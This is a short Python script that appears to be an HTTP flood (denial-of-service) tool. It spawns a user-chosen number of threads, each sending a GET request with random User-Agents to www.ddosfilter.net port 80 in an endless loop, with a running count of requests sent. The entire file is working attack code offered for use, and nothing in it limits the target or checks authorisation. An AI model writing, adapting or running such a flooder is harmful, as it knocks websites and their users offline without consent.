import random
import socket
import threading

import socks

server = 'www.ddosfilter.net'
port = 80
rs = 0
closed = 0


def LaunchSOC(th):
    req = "GET " + '/' + " HTTP/1.1\r\nHost: " + 'www.ddosfilter.net' + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    print(req)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(req,))
            thd.start()
            print(thd.name)
        except:
            pass


def AttackSOC(req):
    global rs, closed, thd
    s = socks.socksocket()
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect((str('www.ddosfilter.net'), int(80)))
    while True:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    rs = rs + 1
                    print(f"Sent: {rs}", end='\r')
            except:
                s.close()
        except:
            pass


if __name__ == '__main__':
    th = int(input("Threads: "))
    ua = open('./ua.txt', 'r').read().split('\n')
    LaunchSOC(th)
